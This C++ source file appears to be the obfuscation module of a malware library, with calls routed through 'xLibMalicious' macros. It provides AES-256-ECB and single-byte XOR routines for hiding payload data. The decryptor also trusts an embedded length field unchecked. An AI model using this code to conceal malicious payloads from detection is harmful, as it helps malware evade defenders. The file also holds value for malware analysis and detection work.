//
// skulk@ioc.ninja
//
#include "xObfuscation.h"

#include "aes256.h"

#include "xLibMaliciousApi.h"
#include "xLibMaliciousExternalApi.h"



bool xObfuscationObfuscateAes(const uint8_t* key, const uint32_t keySize, const uint8_t* plain, const uint32_t plainSize, uint8_t** obfuscated, uint32_t* obfuscatedSize)
{
	if (!key || keySize != 32 || !plain || !plainSize || !obfuscated || !obfuscatedSize)
	{
		return false;
	}

	const uint32_t blockSize = keySize / 2;

	const uint32_t payloadSize = sizeof(uint32_t) + plainSize;

	const uint32_t bufferSize = payloadSize + (blockSize - payloadSize % blockSize);

	uint8_t* buffer = (uint8_t*) X_LIB_MALICIOUS_CALL(xMemoryAlloc)(bufferSize);

	if (buffer)
	{
		memcpy(buffer, &plainSize, sizeof(plainSize));

		memcpy(buffer + sizeof(plainSize), plain, plainSize);

		aes256_context ctx;

		X_LIB_MALICIOUS_EXTERNAL_CALL(aes256_init)(&ctx, const_cast<uint8_t*>(key));

		for (uint32_t i = 0; i < bufferSize; i += (keySize / 2))
		{
			X_LIB_MALICIOUS_EXTERNAL_CALL(aes256_encrypt_ecb)(&ctx, buffer + i);
		}

		X_LIB_MALICIOUS_EXTERNAL_CALL(aes256_done)(&ctx);
	}

	*obfuscated = buffer;

	*obfuscatedSize = bufferSize;

	return true;
}



bool xObfuscationDeobfuscateAes(const uint8_t* key, const uint32_t keySize, const uint8_t* obfuscated, const uint32_t obfuscatedSize, uint8_t** plain, uint32_t* plainSize)
{
	if (!key || keySize != 32 || !obfuscated || !obfuscatedSize || !plain || !plainSize)
	{
		return false;
	}

	uint8_t* result = NULL;

	uint32_t resultSize = 0;

	uint8_t* buffer = (uint8_t*) X_LIB_MALICIOUS_CALL(xMemoryAlloc)(obfuscatedSize);

	if (buffer)
	{
		memcpy(buffer, obfuscated, obfuscatedSize);

		aes256_context ctx;

		X_LIB_MALICIOUS_EXTERNAL_CALL(aes256_init)(&ctx, const_cast<uint8_t*>(key));

		for (uint32_t i = 0; i < obfuscatedSize; i += (keySize / 2))
		{
			X_LIB_MALICIOUS_EXTERNAL_CALL(aes256_decrypt_ecb)(&ctx, buffer + i);
		}

		X_LIB_MALICIOUS_EXTERNAL_CALL(aes256_done)(&ctx);

		memcpy(&resultSize, buffer, sizeof(resultSize));

		result = (uint8_t*) X_LIB_MALICIOUS_CALL(xMemoryAlloc)(resultSize);

		memcpy(result, buffer + sizeof(resultSize), resultSize);

		X_LIB_MALICIOUS_CALL(xMemoryFree)(buffer);
	}

	*plain = result;

	*plainSize = resultSize;

	return true;
}



bool xObfuscationObfuscateXor(const uint8_t key, const uint8_t* plain, const uint32_t plainSize, uint8_t** obfuscated)
{
	if (!key || !plain || !plainSize || !obfuscated)
	{
		return false;
	}

	uint8_t* buffer = (uint8_t*) X_LIB_MALICIOUS_CALL(xMemoryAlloc)(plainSize);

	if (buffer)
	{
		memcpy(buffer, plain, plainSize);

		for (uint32_t i = 0; i < plainSize; i++)
		{
			buffer[i] ^= key;
		}
	}

	*obfuscated = buffer;

	return true;
}



bool xObfuscationDeobfuscateXor(const uint8_t key, const uint8_t* obfuscated, const uint32_t obfuscatedSize, uint8_t** plain)
{
	return X_LIB_MALICIOUS_CALL(xObfuscationObfuscateXor)(key, obfuscated, obfuscatedSize, plain);
}
